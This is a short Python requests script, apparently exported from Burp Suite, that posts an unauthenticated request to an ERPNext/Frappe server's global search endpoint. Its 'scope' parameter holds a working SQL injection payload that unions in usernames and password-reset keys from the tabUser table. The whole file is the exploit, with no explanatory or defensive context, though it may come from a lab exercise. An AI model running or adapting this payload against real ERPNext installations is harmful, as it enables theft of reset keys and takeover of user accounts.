import requests

burp0_url = "http://erpnext:8000/"
burp0_cookies = {"sid": "Guest", "full_name": "Guest", "user_id": "Guest", "system_user": "yes", "user_image": ""}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Frappe-CSRF-Token": "None", "X-Requested-With": "XMLHttpRequest", "Origin": "http://erpnext:8000", "Connection": "close", "Referer": "http://erpnext:8000/login", "Cache-Control": "max-age=0"}
burp0_data = {"cmd": "frappe.utils.global_search.web_search", "text": "donkey", "scope": "donkey_scope\"union all select name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#"}
proxies = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080'
}
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, proxies=proxies)